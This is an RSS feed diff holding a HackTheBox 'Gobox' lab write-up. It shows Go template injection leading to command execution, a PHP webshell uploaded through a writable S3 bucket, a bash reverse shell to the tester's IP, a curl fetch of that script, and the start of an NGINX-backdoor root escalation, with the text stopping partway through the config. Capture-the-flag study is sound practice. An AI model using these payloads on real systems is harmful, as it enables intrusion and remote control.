@@ -1,17 +1,17 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>S3 on Ef&#39;s log</title>
+    <title>s3 on Ef&#39;s log</title>
     <link>https://fahmifj.github.io/tags/s3/</link>
-    <description>Recent content in S3 on Ef&#39;s log</description>
+    <description>Recent content in s3 on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Sun, 12 Sep 2021 12:33:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/s3/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Gobox</title>
-      <link>https://fahmifj.github.io/hackthebox/gobox/</link>
+      <link>https://fahmifj.github.io/ctf/hackthebox/gobox/</link>
       <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/hackthebox/gobox/</guid>
+      <guid>https://fahmifj.github.io/ctf/hackthebox/gobox/</guid>
       <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
       <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI can be exploited to leak credentials and these can be used to login into the web app. After logging in, the app provides its source code. The source code reveals a debug mode that allows code execution to the underlying system, which is a container. Enumeration within the container reveals that it can interact with simulated Amazon S3 and has write permission on a bucket, thus allows  me to drop a web shell to gain a foothold on the host system. Further enumeration on the host reveals an NGINX backdoor which can be leveraged to escalate to root.</p>
 <p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
@@ -30,7 +30,8 @@
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
 <p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ fscan 10.10.11.113 gobox
 </span></span><span class="line"><span class="cl">nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
 </span></span><span class="line"><span class="cl">nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
@@ -52,8 +53,8 @@
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
-</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds</span></span></code></pre>
+</figure><h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
 <p>The site on port 80 is a Hacking eSports homepage.</p>
 <p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
@@ -67,14 +68,15 @@
 <p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
 </p>
 <p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
 </span></span><span class="line"><span class="cl">$ curl -s -I http://10.10.11.113:8080       
 </span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
 </span></span><span class="line"><span class="cl">Server: nginx
 </span></span><span class="line"><span class="cl">Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
 </span></span><span class="line"><span class="cl">Connection: keep-alive
-</span></span><span class="line"><span class="cl">X-Forwarded-Server: golang
-</span></span></code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
+</span></span><span class="line"><span class="cl">X-Forwarded-Server: golang</span></span></code></pre>
+</figure><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
 <p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
 </p>
 <p>The following is how the HTTP request and the HTTP response look like.</p>
@@ -86,8 +88,9 @@
 <p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/"target="_blank" rel="noopener noreferrer"
 >this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2"target="_blank" rel="noopener noreferrer"
 >struct</a> that has email property, I send the following payload:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">email={{.Email}}
-</span></span></code></pre></div><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">email={{.Email}}</span></span></code></pre>
+</figure><p>And in the response there is an email address: <code>ippsec@hacking.esports</code> which means the site is vulnerable to SSTI!</p>
 <p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
 </p>
 <p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
@@ -98,7 +101,8 @@
 </p>
 <h4 id="rce">RCE</h4>
 <p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and passes it to the <code>exec.Command</code> function.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="o">...</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="o">...</span>
 </span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
@@ -111,8 +115,8 @@
 </span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">...</span>
-</span></span></code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
+</span></span><span class="line"><span class="cl"><span class="o">...</span></span></span></code></pre>
+</figure><p>Because it is a method of struct <code>User</code>, and this struct is rendered by the template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>). For example, <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
 </p>
 <p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
@@ -120,7 +124,8 @@
 </p>
 <p>Based on <a href="https://pkg.go.dev/html/template"target="_blank" rel="noopener noreferrer"
 >the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cmd</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">html</span>
@@ -152,18 +157,20 @@
 </span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>	
 </span></span><span class="line"><span class="cl">		<span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">	<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-</span></span></code></pre></div><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.97»
+</span></span><span class="line"><span class="cl">		<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span></span></span></code></pre>
+</figure><p>Using that wrapper, I have ability to send OS command from my CLI to the compromised container.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ python3 ./gobox_ssti.py http://10.10.11.113:8080/forgot/
 </span></span><span class="line"><span class="cl">&gt; id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span></span><span class="line"><span class="cl">&gt; uname -a
-</span></span><span class="line"><span class="cl">Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
-</span></span></code></pre></div><h3 id="shell-as-www-data">Shell as www-data</h3>
+</span></span><span class="line"><span class="cl">Linux aws 5.4.0-81-generic <span class="c1">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span></span></code></pre>
+</figure><h3 id="shell-as-www-data">Shell as www-data</h3>
 <h4 id="s3-enumeration">S3 enumeration</h4>
 <p>While I was enumerating the installed binary to get a foothold on the container, I found an <code>aws</code> binary.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; ls -l /usr/bin/aws
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; ls -l /usr/bin/aws
 </span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">815</span> Jun <span class="m">17</span>  <span class="m">2020</span> /usr/bin/aws
 </span></span><span class="line"><span class="cl">&gt; aws 
 </span></span><span class="line"><span class="cl">usage: aws <span class="o">[</span>options<span class="o">]</span> &lt;command&gt; &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
@@ -172,19 +179,22 @@
 </span></span><span class="line"><span class="cl">  aws <span class="nb">help</span>
 </span></span><span class="line"><span class="cl">  aws &lt;command&gt; <span class="nb">help</span>
 </span></span><span class="line"><span class="cl">  aws &lt;command&gt; &lt;subcommand&gt; <span class="nb">help</span>
-</span></span><span class="line"><span class="cl">aws: error: the following arguments are required: <span class="nb">command</span>
-</span></span></code></pre></div><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls
-</span></span><span class="line"><span class="cl">2021-09-07 07:32:42 website
-</span></span></code></pre></div><p>The bucket contains 4 files.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls website
+</span></span><span class="line"><span class="cl">aws: error: the following arguments are required: command</span></span></code></pre>
+</figure><p>I will send <code>aws s3 ls</code>  to list the available buckets and there is one called <code>website</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls
+</span></span><span class="line"><span class="cl">2021-09-07 07:32:42 website</span></span></code></pre>
+</figure><p>The bucket contains 4 files.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 ls website
 </span></span><span class="line"><span class="cl">PRE css/
 </span></span><span class="line"><span class="cl">2021-09-07 07:32:42    <span class="m">1294778</span> bottom.png
 </span></span><span class="line"><span class="cl">2021-09-07 07:32:42     <span class="m">165551</span> header.png
 </span></span><span class="line"><span class="cl">2021-09-07 07:32:42          <span class="m">5</span> index.html
-</span></span><span class="line"><span class="cl">2021-09-07 07:32:42       <span class="m">1803</span> index.php
-</span></span></code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 cp s3://website/index.php /tmp/id.php
+</span></span><span class="line"><span class="cl">2021-09-07 07:32:42       <span class="m">1803</span> index.php</span></span></code></pre>
+</figure><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; aws s3 cp s3://website/index.php /tmp/id.php
 </span></span><span class="line"><span class="cl">download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
 </span></span><span class="line"><span class="cl">&gt; cat /tmp/id.php
 </span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
@@ -196,49 +206,56 @@
 </span></span><span class="line"><span class="cl">  &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
 </span></span><span class="line"><span class="cl">  &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
 </span></span><span class="line"><span class="cl">  &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><p>I also find that I have write access on this bucket.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><p>I also find that I have write access on this bucket.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
 </span></span><span class="line"><span class="cl">upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
 </span></span><span class="line"><span class="cl">&gt; aws s3 cp /tmp/iamf.php s3://website/
-</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
-</span></span></code></pre></div><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
+</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining</span></span></code></pre>
+</figure><p>When I visit back the homepage and append my filename <code>10.10.11.113/iamf.php</code>, it is there and it processes the PHP code.</p>
 <p><div class="img-container"><img src="imgs/image-20210908091305043.png" alt="image-20210908091305043"  /></div>
 </p>
 <p>Also, instead of <code>Linux aws ...</code>  it returns with <code>Linux gobox ...</code>, that means the homepage is hosted in a different system.</p>
 <h4 id="webshell">Webshell</h4>
 <p>This time I will upload a PHP webshell, but first I will encode the payload with base64 to avoid the bad characters.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.97»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[f]) ?&gt;&#39;</span> <span class="p">|</span> base64 -w0
-</span></span><span class="line"><span class="cl">PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
-</span></span></code></pre></div><p>I will send and transfer that payload to S3 via the RCE wrapper.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
+</span></span><span class="line"><span class="cl">PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span></span></span></code></pre>
+</figure><p>I will send and transfer that payload to S3 via the Python wrapper.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s1">&#39;PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg==&#39;</span> <span class="p">|</span> base64 -d &gt; /tmp/iamf-shell.php
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">&gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
-</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
-</span></span></code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
+</span></span><span class="line"><span class="cl">upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg</span></span></code></pre>
+</figure><p>And my webshell is now accessible on the homepage site.</p>
 <p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
 </p>
 <h4 id="reverse-shell">Reverse Shell</h4>
 <p>This system has some Linux binaries that I can use to get a foothold, one of which is <code>curl</code>. First, I will craft my reverse shell script and host it afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97» 
 </span></span><span class="line"><span class="cl">$ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
-</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
-</span></span></code></pre></div><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh
-</span></span></code></pre></div><p>Now I will get my listener ready and execute my reverse shell script.</p>
+</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span></span></span></code></pre>
+</figure><p>On my webshell, I will  grab that script and save it to target&rsquo;s <code>/tmp/</code> dir.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://10.10.11.113/iamf-shell.php?f=curl%20-s%20%20http://10.10.14.97:8080/rce.sh%20%20%3E%20/tmp/rce.sh</span></span></code></pre>
+</figure><p>Now I will get my listener ready and execute my reverse shell script.</p>
 <p><div class="img-container"><img src="imgs/image-20210908165236310.png" alt="image-20210908165236310"  /></div>
 </p>
 <p>On my listener:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «gobox» «10.10.14.97»
 </span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.97<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.113<span class="o">]</span> <span class="m">59898</span>
 </span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>770<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
 </span></span><span class="line"><span class="cl">bash: no job control in this shell
-</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$
-</span></span></code></pre></div><p>I will do the PTY trick and upgrade my shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt/website$ script /dev/null -c bash
+</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$</span></span></code></pre>
+</figure><p>I will do the PTY trick and upgrade my shell.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt/website$ script /dev/null -c bash
 </span></span><span class="line"><span class="cl">script /dev/null -c bash
 </span></span><span class="line"><span class="cl">Script started, file is /dev/null
 </span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ ^Z
@@ -248,9 +265,10 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  - <span class="m">4264</span> continued  nc -nvlp <span class="m">53</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span>
-</span></span></code></pre></div><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
+</span></span><span class="line"><span class="cl">www-data@gobox:/opt/website$ stty cols <span class="m">171</span> rows <span class="m">30</span></span></span></code></pre>
+</figure><p>It turns out that the user flag is readable by <code>www-data</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/$ cat /etc/passwd <span class="p">|</span> grep sh$
 </span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
 </span></span><span class="line"><span class="cl">ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
 </span></span><span class="line"><span class="cl">www-data@gobox:/$ ls -lR /home/ubuntu
@@ -258,13 +276,14 @@
 </span></span><span class="line"><span class="cl">total <span class="m">4</span>
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">33</span> Aug <span class="m">26</span> 21:10 user.txt
 </span></span><span class="line"><span class="cl">www-data@gobox:/$ cat /home/ubuntu/user.txt
-</span></span><span class="line"><span class="cl">d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...
-</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+</span></span><span class="line"><span class="cl">d6b91...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-root">Shell as root</h3>
 <h4 id="enumeration-1">Enumeration</h4>
 <p>When enumerating the network connections, there are some ports that seem to be missed by my <code>nmap</code> scan (I&rsquo;ll look into this in the <a href="#explore"target="_blank" rel="noopener noreferrer"
 >explore</a> section).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@gobox:/opt$ netstat -tlpn
 </span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
 </span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
@@ -279,9 +298,10 @@
 </span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
 </span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
 </span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
-</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
-</span></span></code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="c1"># LocalStack that simulates AWS S3
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN</span></span></code></pre>
+</figure><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="line"><span class="cl"><span class="c1"># LocalStack that simulates AWS S3
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -334,10 +354,11 @@
 </span></span><span class="line"><span class="cl">        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
